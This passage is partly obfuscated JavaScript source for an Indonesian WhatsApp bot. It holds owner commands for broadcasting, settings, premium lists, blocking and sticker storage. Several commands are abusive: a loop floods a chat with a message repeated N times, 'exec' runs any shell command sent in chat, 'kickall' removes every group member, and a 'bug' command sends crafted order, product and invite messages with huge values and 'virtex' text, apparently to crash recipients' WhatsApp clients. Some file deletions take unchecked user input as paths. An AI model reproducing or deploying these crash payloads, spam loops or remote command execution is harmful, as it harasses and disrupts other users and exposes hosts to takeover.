anu){sendMess(_['jid'],_0x39f6c9(0x28c)+body[_0x39f6c9(0x24a)](0x4));}reply('```SUKSESS\x20BROADCAST```');}}}}}break;case _0x39f6c9(0x10c):if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(isBanned)return replysticker(banstc);if(!isOwner)return replysticker(ownerstc);if(args['length']<0x1)return reply('Penggunaan\x20'+prefix+_0x39f6c9(0x231));argzi=arg[_0x39f6c9(0x15b)]('|');if(!argzi)return reply('Penggunaan\x20'+prefix+_0x39f6c9(0x1da));if(isNaN(argzi[0x1]))return reply(_0x39f6c9(0xea));for(let i=0x0;i<argzi[0x1];i++){client[_0x39f6c9(0x208)](from,argzi[0x0],MessageType[_0x39f6c9(0xf4)]);}break;case _0x39f6c9(0x29d):if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(isBanned)return replysticker(banstc);if(!isOwner)return replysticker(ownerstc);if((isMedia&&!mek[_0x39f6c9(0x265)]['videoMessage']||isQuotedSticker)&&args[_0x39f6c9(0x2cb)]==0x0){encmedia=isQuotedSticker?JSON[_0x39f6c9(0x219)](JSON['stringify'](mek)[_0x39f6c9(0x2a7)](_0x39f6c9(0x106),'m'))[_0x39f6c9(0x265)]['extendedTextMessage'][_0x39f6c9(0x1a0)]:mek,file=await client['downloadAndSaveMediaMessage'](encmedia,filename=getRandom()),value=args[_0x39f6c9(0x19d)]('\x20');var group=await client['groupMetadata'](from),member=group[_0x39f6c9(0x136)],mem=[];member[_0x39f6c9(0x2d9)](async _0x7579b7=>{const _0x4fbfce=_0x39f6c9;mem[_0x4fbfce(0x230)](_0x7579b7['id']['replace'](_0x4fbfce(0x229),_0x4fbfce(0x28e)));});var options={'contextInfo':{'mentionedJid':mem},'quoted':mek};ini_buffer=fs[_0x39f6c9(0x1cb)](file),client[_0x39f6c9(0x208)](from,ini_buffer,sticker,options),fs[_0x39f6c9(0x169)](file);}else{if((isMedia&&!mek[_0x39f6c9(0x265)][_0x39f6c9(0x1fb)]||isQuotedImage)&&args[_0x39f6c9(0x2cb)]==0x0){encmedia=isQuotedImage?JSON[_0x39f6c9(0x219)](JSON[_0x39f6c9(0x109)](mek)[_0x39f6c9(0x2a7)]('quotedM','m'))[_0x39f6c9(0x265)][_0x39f6c9(0x233)][_0x39f6c9(0x1a0)]:mek,file=await client[_0x39f6c9(0x2bf)](encmedia,filename=getRandom()),value=args[_0x39f6c9(0x19d)]('\x20');var group=await client['groupMetadata'](from),member=group[_0x39f6c9(0x136)],mem=[];member[_0x39f6c9(0x2d9)](async _0x127e85=>{const _0x49f228=_0x39f6c9;mem['push'](_0x127e85['id'][_0x49f228(0x2a7)](_0x49f228(0x229),_0x49f228(0x28e)));});var options={'contextInfo':{'mentionedJid':mem},'quoted':mek};ini_buffer=fs['readFileSync'](file),client[_0x39f6c9(0x208)](from,ini_buffer,image,options),fs[_0x39f6c9(0x169)](file);}else{if((isMedia&&!mek['message'][_0x39f6c9(0x1fb)]||isQuotedAudio)&&args[_0x39f6c9(0x2cb)]==0x0){encmedia=isQuotedAudio?JSON['parse'](JSON[_0x39f6c9(0x109)](mek)[_0x39f6c9(0x2a7)](_0x39f6c9(0x106),'m'))[_0x39f6c9(0x265)][_0x39f6c9(0x233)][_0x39f6c9(0x1a0)]:mek,file=await client[_0x39f6c9(0x2bf)](encmedia,filename=getRandom()),value=args['join']('\x20');var group=await client[_0x39f6c9(0x25c)](from),member=group[_0x39f6c9(0x136)],mem=[];member['map'](async _0x5196c3=>{const _0x407551=_0x39f6c9;mem[_0x407551(0x230)](_0x5196c3['id'][_0x407551(0x2a7)](_0x407551(0x229),'s.whatsapp.net'));});var options={'mimetype':_0x39f6c9(0x132),'ptt':!![],'contextInfo':{'mentionedJid':mem},'quoted':mek};ini_buffer=fs[_0x39f6c9(0x1cb)](file),client[_0x39f6c9(0x208)](from,ini_buffer,audio,options),fs[_0x39f6c9(0x169)](file);}else{if((isMedia&&!mek[_0x39f6c9(0x265)][_0x39f6c9(0x1fb)]||isQuotedVideo)&&args[_0x39f6c9(0x2cb)]==0x0){encmedia=isQuotedVideo?JSON['parse'](JSON[_0x39f6c9(0x109)](mek)['replace'](_0x39f6c9(0x106),'m'))[_0x39f6c9(0x265)][_0x39f6c9(0x233)][_0x39f6c9(0x1a0)]:mek,file=await client[_0x39f6c9(0x2bf)](encmedia,filename=getRandom()),value=args['join']('\x20');var group=await client[_0x39f6c9(0x25c)](from),member=group['participants'],mem=[];member[_0x39f6c9(0x2d9)](async _0x49fed8=>{const _0x48f79a=_0x39f6c9;mem['push'](_0x49fed8['id'][_0x48f79a(0x2a7)](_0x48f79a(0x229),_0x48f79a(0x28e)));});var options={'mimetype':_0x39f6c9(0x24d),'contextInfo':{'mentionedJid':mem},'quoted':mek};ini_buffer=fs[_0x39f6c9(0x1cb)](file),client[_0x39f6c9(0x208)](from,ini_buffer,video,options),fs[_0x39f6c9(0x169)](file);}else reply(_0x39f6c9(0x227)+prefix+'totag');}}}break;case _0x39f6c9(0xa8):if(isBanned)return replysticker(banstc);if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(!isOwner)return replysticker(ownerstc);const mode1343432w='*Support\x20Nekopoi.Care*\x0a*Offical\x20Bot\x20By\x20@'+numbernye[_0x39f6c9(0x15b)]('@')[0x0]+_0x39f6c9(0x173)+ow[_0x39f6c9(0x15b)]('@')[0x0]+'*',mode423421343=[{'buttonId':_0x39f6c9(0x158),'buttonText':{'displayText':_0x39f6c9(0x19b)},'type':0x1},{'buttonId':'setmenu\x20ori','buttonText':{'displayText':'Ori'},'type':0x1}];if(args[0x0]==_0x39f6c9(0x198))mainmenu=![],sendButtonImageLoc(from,_0x39f6c9(0x193),buttonsmenu1,buttonsmenu2,{'quoted':mek,'contextInfo':{'mentionedJid':[player,numbernye,ow,dev]}});else args[0x0]==_0x39f6c9(0xa4)?(mainmenu=!![],sendButtonImageLoc(from,_0x39f6c9(0x288),buttonsmenu1,buttonsmenu2,{'quoted':mek,'contextInfo':{'mentionedJid':[player,numbernye,ow,dev]}})):await sendButtonText(from,'_Pilih\x20Tiipe\x20Di\x20Bawah\x20Ini_',mode1343432w,mode423421343,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});break;case _0x39f6c9(0x260):if(isBanned)return reply(ind[_0x39f6c9(0x1f1)]());if(!isRegistered)return reply(ind[_0x39f6c9(0x1cd)]());if(!isOwner)return reply(ind[_0x39f6c9(0x149)]());if(args['length']==args[0x1])return reply(_0x39f6c9(0xc9)+prefix+command+_0x39f6c9(0x24b));if(args[0x0]===_0x39f6c9(0x123)){if(antidel===!![])return;antidel=!![],reply(_0x39f6c9(0x2a3));}else{if(args[0x0]==='anticall'){if(antical===!![])return;antical=!![],reply(_0x39f6c9(0x2a2));}else{if(args[0x0]===_0x39f6c9(0x2a8)){if(readG===!![])return;readG=!![],reply(_0x39f6c9(0xbb));}else{if(args[0x0]===_0x39f6c9(0x2a5)){if(readP===!![])return;readP=!![],reply('Succes\x20mengaktifkan\x20autoread\x20pribadi');}else{if(args[0x0]===_0x39f6c9(0xe2)){if(antitags===!![])return;antitags=!![],reply('Succes\x20mengaktifkan\x20antitag');}else{if(args[0x0]===_0x39f6c9(0x1ba)){if(bugc===!![])return;bugc=!![],antitrol=!![],reply(_0x39f6c9(0xf6));}else reply(_0x39f6c9(0x157)+(prefix+command)+_0x39f6c9(0x25e));}}}}}break;case _0x39f6c9(0x1ed):if(isBanned)return reply(ind[_0x39f6c9(0x1f1)]());if(!isRegistered)return reply(ind[_0x39f6c9(0x1cd)]());if(!isOwner)return reply(ind[_0x39f6c9(0x149)]());if(args[_0x39f6c9(0x2cb)]==args[0x1])return reply('Cara\x20Menggunakannya\x20'+prefix+command+_0x39f6c9(0x24b));if(args[0x0]==='antidelete'){if(antidel===![])return;antidel=![],reply(_0x39f6c9(0x168));}else{if(args[0x0]===_0x39f6c9(0x21c)){if(antical===![])return;antical=![],reply(_0x39f6c9(0x107));}else{if(args[0x0]==='autoreadgc'){if(readG===![])return;readG=![],reply(_0x39f6c9(0x235));}else{if(args[0x0]===_0x39f6c9(0x2a5)){if(readP===![])return;readP=![],reply(_0x39f6c9(0x1df));}else{if(args[0x0]===_0x39f6c9(0xe2)){if(antitags===![])return;antitags=![],reply(_0x39f6c9(0x23d));}else{if(args[0x0]==='antibug'){if(bugc===![])return;bugc=![],antitrol=![],reply(_0x39f6c9(0x228));}else reply(_0x39f6c9(0x157)+(prefix+command)+_0x39f6c9(0x25e));}}}}}break;case'settheme':if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(isBanned)return replysticker(banstc);if(!isOwner)return replysticker(ownerstc);if(args[0x0]===_0x39f6c9(0x26e))themenye=''+cecan,reply(_0x39f6c9(0x285));else{if(args[0x0]===_0x39f6c9(0x1c9))themenye=''+cogan,reply(_0x39f6c9(0x1ae));else{if(args[0x0]===_0x39f6c9(0x238))themenye=''+meme,reply(_0x39f6c9(0x225));else{if(args[0x0]===_0x39f6c9(0x196))themenye=''+genshin,reply(_0x39f6c9(0x19f));else{if(args[0x0]==='lol')themenye=''+lol,reply('Succes\x20change\x20theme\x20lol');else{if(args[0x0]==='ml')themenye=''+ml,reply(_0x39f6c9(0x12f));else args[0x0]===_0x39f6c9(0x1d1)?(themenye=''+deflttheme,reply(_0x39f6c9(0x1de))):reply('◪\x20*List\x20Anti\x20Link*\x0a├default\x0a├cecan\x0a├cogan\x0a├meme\x0a├genshin\x0a├lol\x0a├ml');}}}}}break;case _0x39f6c9(0x286):if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(isBanned)return replysticker(banstc);if(!isOwner)return replysticker(ownerstc);if(args[0x0]===_0x39f6c9(0xce))linknye=''+linkcom,reply('Succes\x20change\x20antilink\x20com');else{if(args[0x0]==='id')linknye=''+linkid,reply(_0x39f6c9(0x2da));else{if(args[0x0]===_0x39f6c9(0x137))linknye=''+linkxyz,reply('Succes\x20change\x20antilink\x20xyz');else{if(args[0x0]==='http')linknye=''+linkhttp,reply(_0x39f6c9(0x202));else{if(args[0x0]==='ly')linknye=''+linkly,reply('Succes\x20change\x20antilink\x20ly');else{if(args[0x0]==='wa')linknye=''+linkwa,reply(_0x39f6c9(0x1f6));else args[0x0]===_0x39f6c9(0x1d1)?(linknye=''+deflt,reply(_0x39f6c9(0x22b))):reply(_0x39f6c9(0x183));}}}}}break;case _0x39f6c9(0x282):if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(isBanned)return replysticker(banstc);if(!isOwner)return replysticker(ownerstc);client[_0x39f6c9(0x2c1)](from,Presence[_0x39f6c9(0x2ba)]);if(!isQuotedImage)return reply(_0x39f6c9(0x2c2)+prefix+_0x39f6c9(0x27e));enmedia=JSON['parse'](JSON['stringify'](mek)[_0x39f6c9(0x2a7)](_0x39f6c9(0x106),'m'))[_0x39f6c9(0x265)]['extendedTextMessage'][_0x39f6c9(0x1a0)],media=await client[_0x39f6c9(0x2bf)](enmedia),await client['updateProfilePicture'](botNumber,media),reply(_0x39f6c9(0x194));break;case _0x39f6c9(0x2d6):if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(isBanned)return replysticker(banstc);if(!isOwner)return replysticker(ownerstc);if(!q)return reply('Example:\x20'+prefix+command+'\x20'+fake);fake=q,reply(_0x39f6c9(0x1ec)+q);break;case _0x39f6c9(0xed):if(isBanned)return replysticker(banstc);if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(!isOwner)return replysticker(ownerstc);if(args['length']<0x1)return reply('Example:\x0a•>\x20'+prefix+'setprefix\x20multi\x0a•>\x20'+prefix+'setprefix\x20<query>');if(args[0x0]===_0x39f6c9(0x2b1)){if(multi===!![])return;multi=!![],reply(_0x39f6c9(0x17e));}else multi=![],pref=args[0x0],reply(_0x39f6c9(0x129)+args[0x0]);break;case _0x39f6c9(0x2b5):if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(isBanned)return replysticker(banstc);if(!isOwner)return replysticker(ownerstc);if(!q)return reply(_0x39f6c9(0x24c));exec(q,(_0x519ec2,_0x1d1792)=>{const _0x2d5acb=_0x39f6c9;if(_0x519ec2)return reply(fake+_0x2d5acb(0x17f)+_0x519ec2);_0x1d1792&&reply(_0x1d1792);});break;case _0x39f6c9(0x1ff):case _0x39f6c9(0xdd):if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(isBanned)return replysticker(banstc);if(!isOwner)return replysticker(ownerstc);if(!q)return reply('Isi\x20teksnya!');client[_0x39f6c9(0x208)](_0x39f6c9(0xf0),''+q,extendedText),reply('Sukses\x20Up\x20story\x20wea\x20teks\x20'+q);break;case _0x39f6c9(0x29f):if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(isBanned)return replysticker(banstc);if(!isOwner)return replysticker(ownerstc);if(isQuotedImage){const swsw=isQuotedImage?JSON[_0x39f6c9(0x219)](JSON[_0x39f6c9(0x109)](mek)[_0x39f6c9(0x2a7)]('quotedM','m'))['message'][_0x39f6c9(0x233)][_0x39f6c9(0x1a0)]:mek;cihcih=await client[_0x39f6c9(0x1d5)](swsw),client[_0x39f6c9(0x208)](_0x39f6c9(0xf0),cihcih,image,{'caption':''+q}),bur='Sukses\x20Upload\x20Story\x20Image\x20dengan\x20Caption:\x20'+q,client[_0x39f6c9(0x208)](from,bur,text,{'quoted':reply});}else reply(_0x39f6c9(0x257));break;case _0x39f6c9(0x1c2):if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(isBanned)return replysticker(banstc);if(!isOwner)return replysticker(ownerstc);if(isQuotedVideo){const swsw=isQuotedVideo?JSON[_0x39f6c9(0x219)](JSON[_0x39f6c9(0x109)](mek)[_0x39f6c9(0x2a7)](_0x39f6c9(0x106),'m'))[_0x39f6c9(0x265)][_0x39f6c9(0x233)]['contextInfo']:mek;cihcih=await client['downloadMediaMessage'](swsw),client['sendMessage'](_0x39f6c9(0xf0),cihcih,video,{'caption':''+q}),bur=_0x39f6c9(0xcb)+q,client[_0x39f6c9(0x208)](from,bur,text,{'quoted':reply});}else reply(_0x39f6c9(0xe6));break;case _0x39f6c9(0xbe):if(isBanned)return replysticker(banstc);if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(!isOwner)return replysticker(ownerstc);ingfoo=await getGroup(totalchat),teks1=_0x39f6c9(0x112)+ingfoo[_0x39f6c9(0x2cb)]+'\x0a\x0a';for(let i=0x0;i<ingfoo[_0x39f6c9(0x2cb)];i++){teks1+=_0x39f6c9(0x103)+ingfoo[i][_0x39f6c9(0xb9)]+_0x39f6c9(0x1f4)+ingfoo[i]['id']+'\x0a•\x20Dibuat\x20:\x20'+moment((''+ingfoo[i]['creation'])*0x3e8)['tz'](_0x39f6c9(0x2d5))[_0x39f6c9(0x280)](_0x39f6c9(0x176))+'\x0a•\x20Jumlah\x20Peserta\x20:\x20'+ingfoo[i]['participants']['length']+'\x0a\x0a';}sendButtonImageLoc(from,buttonsmenu5,teks1,buttonsmenu2,{'quoted':mek,'contextInfo':{'mentionedJid':[player,numbernye,ow,dev]}});break;case _0x39f6c9(0xb3):if(isBanned)return replysticker(banstc);if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(!isOwner)return replysticker(ownerstc);if(args[0x0]===_0x39f6c9(0x162))buf=WMthumb,imeu=await client['prepareMessage'](_0x39f6c9(0x1ee),buf,image),imeg=imeu['message']['imageMessage'],res=await client['prepareMessageFromContent'](from,{'groupInviteMessage':{'groupJid':_0x39f6c9(0x172),'inviteCode':_0x39f6c9(0x1d9),'inviteExpiration':_0x39f6c9(0x24f),'groupName':_0x39f6c9(0x178)+vipi,'jpegThumbnail':WMthumb,'caption':_0x39f6c9(0x195),'contextInfo':{'forwardingScore':0x3,'isForwarded':!![]}}},{'quoted':imeu,'contextInfo':{}}),client[_0x39f6c9(0x147)](res),await setTimeout(()=>{const _0xf51764=_0x39f6c9;reply(_0xf51764(0x240)+vipi);},0xbb8);else{if(args[0x0]==='troli')buf=WMthumb,imeu=await client[_0x39f6c9(0x139)](_0x39f6c9(0x1ee),buf,image),imeg=imeu[_0x39f6c9(0x265)][_0x39f6c9(0x164)],res=await client[_0x39f6c9(0x210)](from,{'orderMessage':{'orderId':_0x39f6c9(0xaa),'thumbnail':WMthumb,'itemCount':0xe8d4a51000,'status':_0x39f6c9(0x22f),'surface':_0x39f6c9(0x1b9),'orderTitle':'LUC\x20BOT\x20~\x20ERROR','message':'KAK\x20PESEN\x20SEBLAK\x20','sellerJid':_0x39f6c9(0x2b2),'token':_0x39f6c9(0x152),'totalAmount1000':_0x39f6c9(0x23a),'totalCurrencyCode':_0x39f6c9(0x121),'contextInfo':{'forwardingScore':0x1869f,'isForwarded':!![]}}},{'quoted':fakeitem,'contextInfo':{}}),client[_0x39f6c9(0x27f)](from,_0x39f6c9(0x10b)),client[_0x39f6c9(0x147)](res);else{if(args[0x0]==='catalog')buf=WMthumb,imeu=await client['prepareMessage']('0@s.whatsapp.net',buf,image),imeg=imeu[_0x39f6c9(0x265)]['imageMessage'],res=await client[_0x39f6c9(0x210)](from,{'productMessage':{'product':{'productImage':imeg,'productId':_0x39f6c9(0xaa),'title':'LUC\x20BOT\x20~\x20ERROR\x20'+vipi,'description':''+virtex,'currencyCode':_0x39f6c9(0x121),'priceAmount1000':'99999999999999999999999999999999','productImageCount':0x1},'businessOwnerJid':_0x39f6c9(0x2b2),'contextInfo':{'forwardingScore':0x3,'isForwarded':!![]}}},{'quoted':fakeitem,'contextInfo':{}}),client['relayWAMessage'](res);else{if(!q){const virtrdrows2=[{'title':_0x39f6c9(0x23c),'description':_0x39f6c9(0x23c),'rowId':'\x20'},{'title':_0x39f6c9(0xf1),'description':_0x39f6c9(0xf1),'rowId':'\x20'},{'title':_0x39f6c9(0xcf),'description':_0x39f6c9(0xcf),'rowId':'\x20'}],sectionsvirrt2=[{'title':_0x39f6c9(0xe0),'rows':virtrdrows2}],buttonvirtrut2={'buttonText':_0x39f6c9(0x209),'footerText':_0x39f6c9(0x214)+numbernye['split']('@')[0x0]+'*\x0a*Powered\x20By\x20@'+ow[_0x39f6c9(0x15b)]('@')[0x0]+'*','description':_0x39f6c9(0x234)+player[_0x39f6c9(0x15b)]('@')[0x0]+_0x39f6c9(0x217),'sections':sectionsvirrt2,'listType':0x1};client[_0x39f6c9(0x208)](from,buttonvirtrut2,MessageType[_0x39f6c9(0xa1)],{'quoted':mek,'contextInfo':{'mentionedJid':[player,numbernye,ow,dev],'externalAdReply':{'title':hahh+_0x39f6c9(0x1db),'body':''+fakereply,'previewType':_0x39f6c9(0x174),'thumbnailUrl':'\x20','thumbnail':WMthumb,'sourceUrl':''+mybio}}});}}}}break;case'kickall':if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(isBanned)return replysticker(banstc);if(!isGroup)return replysticker(grupstc);if(!isOwner)return replysticker(ownerstc);members_id=[],teks=args[_0x39f6c9(0x2cb)]>0x1?body['slice'](0x8)[_0x39f6c9(0xad)]():'',teks+='\x0a\x0a';for(let mem of groupMembers){teks+='*😘*\x20'+mem[_0x39f6c9(0x11b)][_0x39f6c9(0x15b)]('@')[0x0]+'\x0a',members_id['push'](mem['jid']);}mentions(teks,members_id,!![]),client[_0x39f6c9(0x27d)](from,members_id);break;case _0x39f6c9(0x274):case _0x39f6c9(0x251):case _0x39f6c9(0x254):if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(isBanned)return replysticker(banstc);if(!isOwner)return replysticker(ownerstc);if(isQuotedSticker){if(!q)return reply(_0x39f6c9(0x1c3)+command+'\x20cmdnya\x20dan\x20tag\x20stickernya');var kodenya=mek[_0x39f6c9(0x265)]['extendedTextMessage']['contextInfo'][_0x39f6c9(0xb0)][_0x39f6c9(0x298)][_0x39f6c9(0x15d)][_0x39f6c9(0x26d)](_0x39f6c9(0x23e));addCmd(kodenya,q),reply(_0x39f6c9(0xd7));}else reply(_0x39f6c9(0x1c3)+command+_0x39f6c9(0x13e));break;case'delcmd':case'uncmd':if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(isBanned)return replysticker(banstc);if(!isOwner)return replysticker(ownerstc);if(!isQuotedSticker)return reply(_0x39f6c9(0x1c3)+command+_0x39f6c9(0x108));var kodenya=mek[_0x39f6c9(0x265)][_0x39f6c9(0x233)][_0x39f6c9(0x1a0)][_0x39f6c9(0xb0)][_0x39f6c9(0x298)][_0x39f6c9(0x15d)][_0x39f6c9(0x26d)](_0x39f6c9(0x23e));scommand[_0x39f6c9(0x11c)](getCommandPosition(kodenya),0x1),fs[_0x39f6c9(0x143)](_0x39f6c9(0x1f9),JSON[_0x39f6c9(0x109)](scommand)),reply(_0x39f6c9(0x293));break;case _0x39f6c9(0x28f):case _0x39f6c9(0x22a):if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(isBanned)return replysticker(banstc);if(!isOwner)return replysticker(ownerstc);if(args[_0x39f6c9(0x2cb)]<0x1)return reply(_0x39f6c9(0xd4)+prefix+command+'\x20nomor\x20atau\x20tag');const addpremiumbot=args[0x0][_0x39f6c9(0x2a7)]('@','')+_0x39f6c9(0xf3);prem['push'](args[0x0]['replace']('@','')+_0x39f6c9(0xf3)),fs[_0x39f6c9(0x143)](_0x39f6c9(0x14b),JSON[_0x39f6c9(0x109)](prem)),client[_0x39f6c9(0x208)](from,_0x39f6c9(0x2ce)+args[0x0]['replace']('@','')+_0x39f6c9(0x1ad)+fake,text,{'quoted':ftoko,'contextInfo':{'mentionedJid':[addpremiumbot]}});break;case _0x39f6c9(0x11e):case _0x39f6c9(0x2cd):if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(isBanned)return replysticker(banstc);if(!isOwner)return replysticker(ownerstc);if(args[_0x39f6c9(0x2cb)]<0x1)return reply(_0x39f6c9(0xd4)+prefix+command+_0x39f6c9(0x11a));const delpremiumbot=args[0x0][_0x39f6c9(0x2a7)]('@','')+'@s.whatsapp.net';var arr=prem;for(var dp=0x0;dp<arr[_0x39f6c9(0x2cb)];dp++){arr[dp]===delpremiumbot&&(arr['splice'](dp,0x1),dp--,fs['writeFileSync'](_0x39f6c9(0x14b),JSON['stringify'](arr)));}client[_0x39f6c9(0x208)](from,_0x39f6c9(0x1a8)+args[0x0]['replace']('@','')+_0x39f6c9(0x2bc)+fake+_0x39f6c9(0x269),text,{'quoted':ftoko,'contextInfo':{'mentionedJid':[delpremiumbot]}});break;case _0x39f6c9(0x1d8):case _0x39f6c9(0x1f5):if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(isBanned)return replysticker(banstc);if(!isOwner)return replysticker(ownerstc);if(args['length']<0x1)return reply(_0x39f6c9(0xd4)+prefix+command+_0x39f6c9(0x11a));client['updatePresence'](from,Presence[_0x39f6c9(0x2ba)]);const blockbot=args[0x0][_0x39f6c9(0x2a7)]('@','')+_0x39f6c9(0xf3);client[_0x39f6c9(0xa0)](args[0x0][_0x39f6c9(0x2a7)]('@','')+_0x39f6c9(0xfe),_0x39f6c9(0x110)),blocked[_0x39f6c9(0x230)](args[0x0][_0x39f6c9(0x2a7)]('@','')+'@s.whatsapp.net'),client[_0x39f6c9(0x208)](from,_0x39f6c9(0x1a8)+args[0x0]['replace']('@','')+'\x20Telah\x20Di\x20Banned\x20Untuk\x20Menggunakan\x20'+fake,text,{'quoted':ftoko,'contextInfo':{'mentionedJid':[blockbot]}});break;case _0x39f6c9(0xd0):case _0x39f6c9(0xcd):if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(isBanned)return replysticker(banstc);if(!isOwner)return replysticker(ownerstc);if(args['length']<0x1)return reply(_0x39f6c9(0xd4)+prefix+command+_0x39f6c9(0x11a));client[_0x39f6c9(0x2c1)](from,Presence[_0x39f6c9(0x2ba)]);const unblockbot=args[0x0][_0x39f6c9(0x2a7)]('@','')+_0x39f6c9(0xf3);var arr=blocked;for(var dp=0x0;dp<arr[_0x39f6c9(0x2cb)];dp++){arr[dp]===unblockbot&&(arr[_0x39f6c9(0x11c)](dp,0x1),dp--);}client[_0x39f6c9(0xa0)](args[0x0][_0x39f6c9(0x2a7)]('@','')+_0x39f6c9(0xfe),_0x39f6c9(0x18e)),client[_0x39f6c9(0x208)](from,_0x39f6c9(0x2ce)+args[0x0][_0x39f6c9(0x2a7)]('@','')+'\x20Telah\x20Di\x20UnBanned\x20Untuk\x20Menggunakan\x20'+fake,text,{'quoted':ftoko,'contextInfo':{'mentionedJid':[unblockbot]}});break;}
switch (command) {
case 'addbadword': 
case 'badword':  
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
if (!isOwner) return replysticker(ownerstc)  
if (args.length < 1) return reply( `Ketik ${prefix}addbadword [kata kasar]. contoh ${prefix}addbadword tolol`)
const bw =  args.join(" ")
bad.push(bw)
fs.writeFileSync('./database/group/bad.json', JSON.stringify(bad))
reply(`Sukses Menambahkan *${bw}* Bad Word!`)
break
 case 'delbadword':
 case 'ubadword':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
if (!isOwner) return replysticker(ownerstc)  
 if (args.length < 1) return reply( `Ketik ${prefix}addbadword [kata kasar]. contoh ${prefix+command} tolol`)
 const bwd =  args.join(" ") 
 var arr = bad
for( var dp = 0; dp < arr.length; dp++){ 
if ( arr[dp] === bwd) { 
arr.splice(dp, 1); 
dp--; 
fs.writeFileSync('./database/group/bad.json',JSON.stringify(arr))}}
reply(`Sukses Menghapus *${bwd}* Bad Word!`)
break
//**********SISTEM STORAGE **********
case 'addsticker':
case 'addstick':  
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
if (!isOwner) return replysticker(ownerstc)  
if (!isQuotedSticker) return reply('Reply stiker nya')
svst = args.join(" ")
if (!svst) return reply('Nama sticker nya apa?')
boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
delb = await client.downloadMediaMessage(boij)
setiker.push(`${svst}`)
fs.writeFileSync(`./strg/sticker/${svst}.webp`, delb)
fs.writeFileSync(`./strg/stik.json`, JSON.stringify(setiker))
reply(`\`\`\`Sukses Menambahkan Sticker\nCek Dengan Cara ${prefix}liststicker\`\`\``)
break
				case 'delsticker':
				case 'delstick': 
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
if (!isOwner) return replysticker(ownerstc)  
					try {
if (!svst) return reply('Nama sticker nya apa?')
	svst = args.join(" ")
					 wanu = setiker.indexOf(svst)
					 setiker.splice(wanu, 1)
					 fs.unlinkSync(`./strg/sticker/${svst}.webp`)
					 reply(`Sukses menghapus sticker ${svst}`)
					} catch (err){
						console.log(err)
						replysticker(errorstc)
					}
					break
					case 'delvn':
					if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
if (!isOwner) return replysticker(ownerstc)  
					try {
if (!svst) return reply('Nama audio nya apa?')
	svst = args.join(" ")
					 wanu = vien.indexOf(svst)
					 audionye.splice(wanu, 1)
					 fs.unlinkSync(`./strg/audio/${svst}.mp3`)
					reply(`Sukses menghapus vn ${svst}`)
					} catch (err){
						console.log(err)
						replysticker(errorstc)
					}
					break
				case 'delimage':
				case 'delimg':
